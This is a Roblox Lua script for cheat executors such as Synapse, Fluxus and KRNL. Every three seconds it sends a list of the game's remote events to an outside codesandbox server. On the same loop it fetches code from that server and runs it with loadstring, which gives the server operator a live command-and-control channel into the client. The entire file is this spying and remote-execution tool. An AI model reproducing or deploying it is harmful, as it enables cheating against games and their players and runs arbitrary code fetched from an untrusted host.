local HttpService = game:GetService("HttpService")

local SERVER = "https://jn5t96-3000.csb.app"
local lastScriptHash = nil

-- Select the most compatible HTTP request method
local HttpRequestMethods = {
    syn = syn and syn.request,
    http = http and http.request,
    fluxus = fluxus and fluxus.request,
    krnl = request,
    default = http_request
}

local httpRequest = HttpRequestMethods[syn and "syn"
    or http and "http"
    or fluxus and "fluxus"
    or request and "krnl"
    or "default"]

-- Function to get all remotes in the game
local function getRemotes()
    local remotes = {}

    local replicatedStorage = game:GetService("ReplicatedStorage")
    for _, obj in ipairs(replicatedStorage:GetDescendants()) do
        if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
            table.insert(remotes, {
                Name = obj.Name,
                ClassName = obj.ClassName,
                Parent = obj.Parent and obj.Parent.Name or "nil"
            })
        end
    end

    return remotes
end

-- Function to send remote data to the server
local function sendRemoteData()
    local remotes = getRemotes()
    local jsonData = HttpService:JSONEncode(remotes)

    if not httpRequest then
        warn("[Error] No compatible HTTP request method found.")
        return
    end

    local success, response = pcall(function()
        return httpRequest({
            Url = SERVER .. "/remote_data",
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = jsonData
        })
    end)

    if success then
        print("[Success] Remote data sent.")
    else
        warn("[Error] Failed to send remote data:", response)
    end
end

-- Function to poll latest script and execute it
local function checkScript()
    if not httpRequest then
        warn("[Error] No compatible HTTP request method found.")
        return
    end

    local success, response = pcall(function()
        return httpRequest({
            Url = SERVER .. "/latest",
            Method = "GET"
        })
    end)

    if success and response and response.Body then
        local content = response.Body
        local currentHash = HttpService:JSONEncode(content)
        if currentHash ~= lastScriptHash then
            lastScriptHash = currentHash
            local fn, err = loadstring(content)
            if fn then
                local ok, execErr = pcall(fn)
                if not ok then
                    warn("[Script Error] Runtime error:", execErr)
                end
            else
                warn("[Script Error] Load error:", err)
            end
        end
    else
        warn("[Error] Failed to fetch latest script:", response and response.StatusMessage or "Unknown error")
    end
end

-- Main loop: script execution and remote spying
task.spawn(function()
    while true do
        checkScript()
        sendRemoteData()
        task.wait(3) -- Repeat every 3 seconds
    end
end)
